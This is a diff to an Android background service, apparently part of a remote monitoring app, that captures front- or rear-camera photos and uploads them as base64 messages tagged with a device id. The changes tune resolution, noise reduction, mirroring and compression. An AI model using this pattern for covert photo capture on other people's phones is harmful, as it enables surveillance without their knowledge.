@@ -1355,9 +1355,10 @@ class MicService : Service() {
                         return@withTimeoutOrNull
                     }
                     
-                    val optimized = optimizePhotoJpeg(jpeg)
+                    val isFrontCamera = (facing == CameraCharacteristics.LENS_FACING_FRONT)
+                    val optimized = optimizePhotoJpeg(jpeg, isFrontCamera)
                     val base64 = Base64.encodeToString(optimized, Base64.NO_WRAP)
-                    val cameraName = if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
+                    val cameraName = if (isFrontCamera) "front" else "rear"
                     val filename = "photo_${deviceId.take(8)}_${cameraName}_${System.currentTimeMillis()}.jpg"
                     val msg = JSONObject().apply {
                         put("type", "photo_upload")
@@ -1368,6 +1369,7 @@ class MicService : Service() {
                         put("filename", filename)
                         put("mime", "image/jpeg")
                         put("aiEnhanced", aiPhotoEnhancementEnabled)
+                        put("lowNetwork", lowNetworkMode)
                         put("data", base64)
                         put("ts", System.currentTimeMillis())
                     }
@@ -1459,24 +1461,39 @@ class MicService : Service() {
         val chars = cm.getCameraCharacteristics(cameraId)
         val captureProfile = buildPhotoCaptureProfile(chars)
         val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
+        
+        // Resolution settings based on quality mode
+        // HD mode: use max resolution for full quality
+        // Normal/Fast: reasonable size that still captures full frame
         val maxEdge = when (photoQualityMode) {
-            "fast" -> 1024
-            "hd" -> 1920
-            else -> 1024
+            "fast" -> 1280   // Increased for better quality
+            "hd" -> 2560     // Allow higher res for HD
+            else -> 1600     // Balanced
         }
+        
         val allSizes = streamMap.getOutputSizes(ImageFormat.JPEG) ?: return null
-        // Prefer standard aspect ratios: 16:9 ≈ 1.78, 4:3 ≈ 1.33, 3:2 = 1.5
-        val standardRatios = listOf(16f/9f, 4f/3f, 3f/2f)
+        
+        // Get sensor aspect ratio for full-frame capture (no crop)
+        val sensorSize = chars.get(CameraCharacteristics.SENSOR_INFO_ACTIVE_ARRAY_SIZE)
+        val sensorRatio = if (sensorSize != null && sensorSize.width() > 0 && sensorSize.height() > 0) {
+            sensorSize.width().toFloat() / sensorSize.height()
+        } else {
+            4f / 3f  // Default to 4:3
+        }
+        
+        // Prefer sizes matching sensor ratio (full frame, no crop)
         val size = allSizes
             .filter { it.width <= maxEdge && it.height <= maxEdge }
             .sortedWith(compareBy<android.util.Size> { sz ->
-                // Calculate aspect ratio (landscape oriented)
+                // Calculate aspect ratio match to sensor (full frame = 0 difference)
                 val ratio = maxOf(sz.width, sz.height).toFloat() / minOf(sz.width, sz.height)
-                standardRatios.minOf { Math.abs(ratio - it) }
-            }.thenByDescending { it.width * it.height })
+                Math.abs(ratio - sensorRatio)
+            }.thenByDescending { it.width * it.height })  // Then prefer larger
             .firstOrNull()
-            ?: allSizes.firstOrNull()
+            ?: allSizes.maxByOrNull { it.width * it.height }  // Fallback: largest available
             ?: return null
+        
+        Log.d(TAG, "Photo capture: ${size.width}x${size.height}, sensor ratio: $sensorRatio")
 
         val thread = HandlerThread("photo_capture_thread").apply { start() }
         val handler = Handler(thread.looper)
@@ -1540,7 +1557,19 @@ class MicService : Service() {
 
             val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                 addTarget(imageReader.surface)
+                
+                // Enable face detection for better focus and exposure
+                set(CaptureRequest.STATISTICS_FACE_DETECT_MODE, 
+                    CaptureRequest.STATISTICS_FACE_DETECT_MODE_SIMPLE)
+                
+                // Auto white balance for accurate colors
+                set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
+                
+                // Disable crop region (full frame)
+                set(CaptureRequest.SCALER_CROP_REGION, chars.get(CameraCharacteristics.SENSOR_INFO_ACTIVE_ARRAY_SIZE))
+                
                 if (captureProfile.exposureNs != null && captureProfile.iso != null) {
+                    // Night mode: manual exposure control
                     set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_OFF)
                     set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_OFF)
                     set(CaptureRequest.SENSOR_EXPOSURE_TIME, captureProfile.exposureNs)
@@ -1548,7 +1577,10 @@ class MicService : Service() {
                     set(CaptureRequest.SENSOR_SENSITIVITY, captureProfile.iso)
                     set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                     set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
+                    // Noise reduction for night shots
+                    set(CaptureRequest.NOISE_REDUCTION_MODE, CaptureRequest.NOISE_REDUCTION_MODE_HIGH_QUALITY)
                 } else {
+                    // Auto mode: let camera decide
                     set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                     set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                     set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
@@ -1557,7 +1589,12 @@ class MicService : Service() {
                         CaptureRequest.FLASH_MODE,
                         if (captureProfile.torch) CaptureRequest.FLASH_MODE_TORCH else CaptureRequest.FLASH_MODE_OFF
                     )
+                    // Standard noise reduction
+                    set(CaptureRequest.NOISE_REDUCTION_MODE, CaptureRequest.NOISE_REDUCTION_MODE_FAST)
                 }
+                
+                // High quality JPEG (we compress later with network awareness)
+                set(CaptureRequest.JPEG_QUALITY, 95.toByte())
             }.build()
 
             capSession.capture(req, object : CameraCaptureSession.CaptureCallback() {}, handler)
@@ -1671,50 +1708,57 @@ class MicService : Service() {
         }
     }
 
-    private fun optimizePhotoJpeg(source: ByteArray): ByteArray {
+    private fun optimizePhotoJpeg(source: ByteArray, isFrontCamera: Boolean = false): ByteArray {
         return try {
             val qualityMode = photoQualityMode
             val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
             BitmapFactory.decodeByteArray(source, 0, source.size, bounds)
+            
+            // Use full resolution for HD, reasonable for others (no aggressive crop)
             val maxEdge = when (qualityMode) {
-                "fast" -> 1024
+                "fast" -> 1280   // Increased from 1024 for better quality
                 "hd" -> 1920
-                else -> 1024
+                else -> 1280
             }
             var sample = 1
             while ((bounds.outWidth / sample) > maxEdge || (bounds.outHeight / sample) > maxEdge) {
                 sample *= 2
             }
             val opts = BitmapFactory.Options().apply { inSampleSize = sample.coerceAtLeast(1) }
-            val bitmap = BitmapFactory.decodeByteArray(source, 0, source.size, opts) ?: return source
+            var bitmap = BitmapFactory.decodeByteArray(source, 0, source.size, opts) ?: return source
+            
+            // Mirror front camera images
+            if (isFrontCamera) {
+                val mirrored = ImageEnhancer.mirrorHorizontally(bitmap)
+                bitmap.recycle()
+                bitmap = mirrored
+            }
+            
             val enhanced = if (aiPhotoEnhancementEnabled) {
-                val avg = estimateLuma(bitmap)
-                val contrast = when {
-                    avg < 85f -> 1.18f
-                    avg > 175f -> 1.08f
-                    else -> 1.12f
+                // Detect capture mode based on brightness
+                val avgLuma = ImageEnhancer.estimateLuma(bitmap)
+                val mode = when {
+                    photoNightMode != "off" -> ImageEnhancer.CaptureMode.NIGHT
+                    else -> ImageEnhancer.detectMode(avgLuma)
                 }
-                val brightness = when {
-                    avg < 85f -> 18f
-                    avg > 185f -> -8f
-                    else -> 6f
-                }
-                val saturation = 1.08f
-                applyColorAdjust(bitmap, contrast, brightness, saturation)
+                
+                Log.d(TAG, "Photo enhancement: luma=$avgLuma, mode=$mode")
+                
+                // Apply full enhancement pipeline
+                ImageEnhancer.enhance(bitmap, mode, null)
             } else {
                 bitmap
             }
-            val out = java.io.ByteArrayOutputStream()
-            val jpegQuality = when (qualityMode) {
-                "fast" -> if (aiPhotoEnhancementEnabled) 78 else 72
-                "hd" -> if (aiPhotoEnhancementEnabled) 90 else 86
-                else -> if (aiPhotoEnhancementEnabled) 84 else 78
-            }
-            enhanced.compress(android.graphics.Bitmap.CompressFormat.JPEG, jpegQuality, out)
+            
+            // Network-aware compression
+            val jpegBytes = ImageEnhancer.compress(enhanced, lowNetworkMode, qualityMode)
+            
             if (enhanced !== bitmap) enhanced.recycle()
             bitmap.recycle()
-            out.toByteArray()
-        } catch (_: Exception) {
+            
+            jpegBytes
+        } catch (e: Exception) {
+            Log.w(TAG, "optimizePhotoJpeg failed: ${e.message}")
             source
         }
     }
